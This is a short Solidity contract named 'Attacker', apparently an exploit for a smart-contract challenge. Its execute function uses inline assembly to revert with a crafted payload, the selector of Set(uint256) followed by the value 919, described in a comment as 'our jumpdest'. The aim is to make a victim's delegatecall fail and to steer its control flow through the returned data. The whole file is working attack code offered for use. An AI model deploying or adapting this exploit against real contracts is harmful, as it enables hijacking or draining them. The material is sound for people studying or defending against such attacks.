pragma solidity ^0.4.23;

contract Attacker {
    
    bytes4 internal constant SEL = bytes4(keccak256('Set(uint256)'));
    
    function execute(address) public pure {
        
        bytes4 sel = SEL;

        assembly {
            // Store sel in memory @0x0 (4 bytes)
            mstore(0, sel)

            // Store 919 (our jumpdest) in memory, just after sel (4 bytes)
            mstore(0x4, 919)

            // Revert exactly 0x24 bytes to the caller, starting at memory position 0x0 
            // Use revert to set the result of the delegatecall function to false (Return will produce true)
            revert(0, 0x24)
        }
    }
}